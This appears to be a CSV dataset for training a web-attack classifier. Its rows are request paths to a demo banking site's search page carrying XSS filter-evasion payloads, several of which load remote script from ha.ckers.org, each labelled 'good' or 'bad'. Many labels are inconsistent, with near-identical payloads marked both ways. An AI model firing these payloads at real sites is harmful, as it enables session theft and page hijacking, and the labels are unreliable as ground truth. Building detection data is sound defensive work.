path,content,host,class_flag
"/search.jsp?query=&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",,demo.testfire.net,['good']
"/search.jsp?query=&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=~scriptualert(EXSSE)~/scriptu,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IFRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/IFRAME&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");",,demo.testfire.net,['good']
"/search.jsp?query=xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\""XSS\""))'&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;STYLE type=\""text/css\""&gt;BODY{background&#58;url(\""javascript&#058;alert('XSS')\"")}&lt;/STYLE&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;!--&#91;if gte IE 4&#93;&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;!&#91;endif&#93;--&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;OBJECT TYPE=\""text/x-scriptlet\"" DATA=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/OBJECT&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;EMBED SRC=\""data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"" type=\""image/svg+xml\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=a=\""get\"";",,demo.testfire.net,['good']
"/search.jsp?query=c=\""javascript&#058;\"";",,demo.testfire.net,['bad']
"/search.jsp?query=b=\""URL(\\""\"";",,demo.testfire.net,['good']
"/search.jsp?query=d=\""alert('XSS');\\"")\"";",,demo.testfire.net,['bad']
/search.jsp?query=eval(a+b+c+d);,,demo.testfire.net,['good']
"/search.jsp?query=&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SPAN DATASRC=\""#xss\"" DATAFLD=\""B\"" DATAFORMATAS=\""HTML\""&gt;&lt;/SPAN&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;XML SRC=\""xsstest&#46;xml\"" ID=I&gt;&lt;/XML&gt;",,demo.testfire.net,['good']
/search.jsp?query=&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;HTML&gt;&lt;BODY&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;?import namespace=\""t\"" implementation=\""#default#time2\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;/BODY&gt;&lt;/HTML&gt;,,demo.testfire.net,['good']
"/search.jsp?query=&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;? echo('&lt;SCR)';,,demo.testfire.net,['good']
"/search.jsp?query=echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT =\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT a=`&gt;` SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""http&#58;//www.google.com\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['good']
"/search.jsp?query=&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;,,demo.testfire.net,['good']
/search.jsp?query=<,,demo.testfire.net,['good']
/search.jsp?query=&lt,,demo.testfire.net,['good']
/search.jsp?query=&lt;,,demo.testfire.net,['good']
/search.jsp?query=&LT,,demo.testfire.net,['good']
/search.jsp?query=&LT;,,demo.testfire.net,['good']
/search.jsp?query=&#60,,demo.testfire.net,['good']
/search.jsp?query=&#060,,demo.testfire.net,['good']
/search.jsp?query=&#0060,,demo.testfire.net,['good']
/search.jsp?query=&#00060,,demo.testfire.net,['good']
/search.jsp?query=&#000060,,demo.testfire.net,['good']
/search.jsp?query=&#0000060,,demo.testfire.net,['good']
/search.jsp?query=&lt;,,demo.testfire.net,['good']
/search.jsp?query=&#x3c,,demo.testfire.net,['good']
/search.jsp?query=&#x03c,,demo.testfire.net,['good']
/search.jsp?query=&#x003c,,demo.testfire.net,['good']
/search.jsp?query=&#x0003c,,demo.testfire.net,['good']
/search.jsp?query=&#x00003c,,demo.testfire.net,['good']
/search.jsp?query=&#x000003c,,demo.testfire.net,['good']
/search.jsp?query=&#x3c;,,demo.testfire.net,['good']
/search.jsp?query=&#x03c;,,demo.testfire.net,['good']
/search.jsp?query=&#x003c;,,demo.testfire.net,['good']
/search.jsp?query=&#x0003c;,,demo.testfire.net,['good']
/search.jsp?query=&#x00003c;,,demo.testfire.net,['good']
/search.jsp?query=&#x000003c;,,demo.testfire.net,['good']
/search.jsp?query=&#X3c,,demo.testfire.net,['good']
/search.jsp?query=&#X03c,,demo.testfire.net,['good']
/search.jsp?query=&#X003c,,demo.testfire.net,['good']
/search.jsp?query=&#X0003c,,demo.testfire.net,['good']
/search.jsp?query=&#X00003c,,demo.testfire.net,['good']
/search.jsp?query=&#X000003c,,demo.testfire.net,['good']
/search.jsp?query=&#X3c;,,demo.testfire.net,['good']
/search.jsp?query=&#X03c;,,demo.testfire.net,['good']
/search.jsp?query=&#X003c;,,demo.testfire.net,['good']
/search.jsp?query=&#X0003c;,,demo.testfire.net,['good']
/search.jsp?query=&#X00003c;,,demo.testfire.net,['good']
/search.jsp?query=&#X000003c;,,demo.testfire.net,['good']
/search.jsp?query=&#x3C,,demo.testfire.net,['good']
/search.jsp?query=&#x03C,,demo.testfire.net,['good']
/search.jsp?query=&#x003C,,demo.testfire.net,['good']
/search.jsp?query=&#x0003C,,demo.testfire.net,['good']
/search.jsp?query=&#x00003C,,demo.testfire.net,['good']
/search.jsp?query=&#x000003C,,demo.testfire.net,['good']
/search.jsp?query=&#x3C;,,demo.testfire.net,['good']
/search.jsp?query=&#x03C;,,demo.testfire.net,['good']
/search.jsp?query=&#x003C;,,demo.testfire.net,['good']
/search.jsp?query=&#x0003C;,,demo.testfire.net,['good']
/search.jsp?query=&#x00003C;,,demo.testfire.net,['good']
/search.jsp?query=&#x000003C;,,demo.testfire.net,['good']
/search.jsp?query=&#X3C,,demo.testfire.net,['good']
/search.jsp?query=&#X03C,,demo.testfire.net,['good']
/search.jsp?query=&#X003C,,demo.testfire.net,['good']
/search.jsp?query=&#X0003C,,demo.testfire.net,['good']
/search.jsp?query=&#X00003C,,demo.testfire.net,['good']
/search.jsp?query=&#X000003C,,demo.testfire.net,['good']
/search.jsp?query=&#X3C;,,demo.testfire.net,['good']
/search.jsp?query=&#X03C;,,demo.testfire.net,['good']
/search.jsp?query=&#X003C;,,demo.testfire.net,['good']
/search.jsp?query=&#X0003C;,,demo.testfire.net,['good']
/search.jsp?query=&#X00003C;,,demo.testfire.net,['good']
/search.jsp?query=&#X000003C;,,demo.testfire.net,['good']
/search.jsp?query=\x3c,,demo.testfire.net,['good']
/search.jsp?query=\x3C,,demo.testfire.net,['good']
/search.jsp?query=\u003c,,demo.testfire.net,['good']
/search.jsp?query=\u003C,,demo.testfire.net,['good']
/search.jsp?query=&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""javascript&#058;alert('XSS')\""",,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,,demo.testfire.net,['good']
/search.jsp?query=&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\""XSS\"")&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""XSS\\"")&gt;\"";' &gt; out",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG SRC=\""javascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
"/search.jsp?query='';!--\""&lt;XSS&gt;=&{()}",,demo.testfire.net,['good']
"/search.jsp?query=';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query='';!--""<XSS>=&{()}",,demo.testfire.net,['bad']
/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascrscriptipt:alert('XSS')>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=JaVaScRiPt:alert('XSS')>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC="" &#14;  javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<<SCRIPT>alert(""XSS"");//<</SCRIPT>",,demo.testfire.net,['bad']
/search.jsp?query=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,,demo.testfire.net,['bad']
"/search.jsp?query=\"";alert('XSS');//",,demo.testfire.net,['bad']
"/search.jsp?query=</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",,demo.testfire.net,['bad']
"/search.jsp?query=<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",,demo.testfire.net,['bad']
"/search.jsp?query=<TABLE BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""width: expression(alert('XSS'));"">",,demo.testfire.net,['bad']
"/search.jsp?query=<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=<XSS STYLE=""xss:expression(alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",,demo.testfire.net,['bad']
"/search.jsp?query=<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",,demo.testfire.net,['bad']
"/search.jsp?query=a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);",,demo.testfire.net,['good']
"/search.jsp?query=<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",,demo.testfire.net,['bad']
